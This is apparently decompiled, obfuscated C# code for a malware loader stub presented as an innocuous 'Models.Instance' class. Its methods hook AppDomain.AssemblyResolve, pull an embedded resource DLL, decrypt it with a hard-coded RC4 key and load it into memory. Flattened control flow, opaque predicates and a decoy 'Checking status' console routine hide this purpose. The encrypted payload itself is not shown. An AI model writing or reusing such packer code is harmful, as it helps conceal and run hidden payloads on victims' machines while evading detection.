using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

namespace Apjmqciddnbbpsnfq.Models;

public class Instance
{
	private int _System;

	private int _Tests;

	private static readonly string proxy = "Wjtnmbfhvsdevzrbpkzdvst";

	private static int m_Mapping;

	private static int invocation;

	private static int m_Manager;

	private static int _State;

	private static int m_Value;

	private static int[] _Schema;

	private static int[] m_Specification;

	private static byte[] m_Ref;

	private static Instance ReadSingleton;

	public void AwakePage()
	{
		InvokeSingleton(AppDomain.CurrentDomain, (ResolveEventHandler)delegate
		{
			string m_Database = "Apjmqciddnbbpsnfq.Oscuhwgrijteinxiakblsjr.dll";
			string name = Array.Find(GetType().Assembly.GetManifestResourceNames(), (string element) => element.EndsWith(m_Database));
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			byte[] array = new byte[stream.Length];
			TestSingleton(stream, array, 0, array.Length);
			return AppDomain.CurrentDomain.Load(CalcPage(array));
		});
	}

	public Instance(int flags_var1)
	{
		_System = 0;
		_Tests = flags_var1;
	}

	public void SetupPage(object var1)
	{
		AutoResetEvent autoResetEvent = (AutoResetEvent)var1;
		Console.WriteLine("{0} Checking status {1,2}.", DateTime.Now.ToString("h:mm:ss.fff"), (++_System).ToString());
		if (_System == _Tests)
		{
			_System = 0;
			autoResetEvent.Set();
			int num = 0;
			if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_2b78c63625d14f5793bb1f16d4b6177e != 0)
			{
				int num2 = default(int);
				num = num2;
			}
			switch (num)
			{
			}
		}
	}

	private static byte[] ResolvePage(byte[] v)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(proxy);
		_Schema = new int[256];
		m_Specification = new int[256];
		m_Ref = new byte[v.Length];
		invocation = 0;
		int num2 = default(int);
		while (true)
		{
			int num;
			if (invocation < 256)
			{
				_Schema[invocation] = bytes[invocation % bytes.Length];
				m_Specification[invocation] = invocation;
				invocation++;
				num = 0;
				if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_b13d4d6cf8bb4c5c885c6d9d79eb1b97 == 0)
				{
					continue;
				}
			}
			else
			{
				FlushPage();
				num = 1;
				if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_538f025f1f4145349862f6b7ba27fa1b == 0)
				{
					num = num2;
				}
			}
			switch (num)
			{
			case 1:
				CollectPage(ref v);
				return m_Ref;
			}
		}
	}

	private static void FlushPage()
	{
		invocation = 0;
		m_Manager = 0;
		int num2 = default(int);
		while (invocation < 256)
		{
			m_Manager = (m_Manager + m_Specification[invocation] + _Schema[invocation]) % 256;
			m_Value = m_Specification[invocation];
			m_Specification[invocation] = m_Specification[m_Manager];
			m_Specification[m_Manager] = m_Value;
			invocation++;
			int num = 0;
			if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_555c1696d1c74ecd86ab20940d10028f != 0)
			{
				num = num2;
			}
			switch (num)
			{
			}
		}
	}

	private static void CollectPage(ref byte[] instance)
	{
		int num = 1;
		while (true)
		{
			invocation = 0;
			m_Manager = 0;
			m_Mapping = 0;
			int num2 = 0;
			if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_6c521c13bd5f4d02a27c5d5c174fa4f6 == 0)
			{
				num2 = num;
			}
			while (true)
			{
				switch (num2)
				{
				default:
					while (invocation < instance.Length)
					{
						m_Mapping++;
						m_Mapping %= 256;
						m_Manager += m_Specification[m_Mapping];
						m_Manager %= 256;
						m_Value = m_Specification[m_Mapping];
						m_Specification[m_Mapping] = m_Specification[m_Manager];
						m_Specification[m_Manager] = m_Value;
						_State = m_Specification[(m_Specification[m_Mapping] + m_Specification[m_Manager]) % 256];
						m_Ref[invocation] = (byte)(instance[invocation] ^ _State);
						invocation++;
					}
					goto IL_00e2;
				case 1:
					break;
				case 2:
					return;
				}
				break;
				IL_00e2:
				num2 = 1;
				if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_2d447b330d084d99917d5616d3061824 == 0)
				{
					return;
				}
			}
		}
	}

	public static byte[] CalcPage(byte[] first)
	{
		return ResolvePage(first);
	}

	[CompilerGenerated]
	private Assembly ConnectPage(object item, ResolveEventArgs token)
	{
		string m_Database = "Apjmqciddnbbpsnfq.Oscuhwgrijteinxiakblsjr.dll";
		string name = Array.Find(GetType().Assembly.GetManifestResourceNames(), (string element) => element.EndsWith(m_Database));
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[stream.Length];
		TestSingleton(stream, array, 0, array.Length);
		return AppDomain.CurrentDomain.Load(CalcPage(array));
	}

	internal static void InvokeSingleton(object object_0, object object_1)
	{
		((AppDomain)object_0).AssemblyResolve += (ResolveEventHandler?)object_1;
	}

	internal static bool CalcSingleton()
	{
		return ReadSingleton == null;
	}

	internal static Instance AssetSingleton()
	{
		return ReadSingleton;
	}

	internal static int TestSingleton(object object_0, object object_1, int int_0, int int_1)
	{
		return ((Stream)object_0).Read((byte[])object_1, int_0, int_1);
	}
}
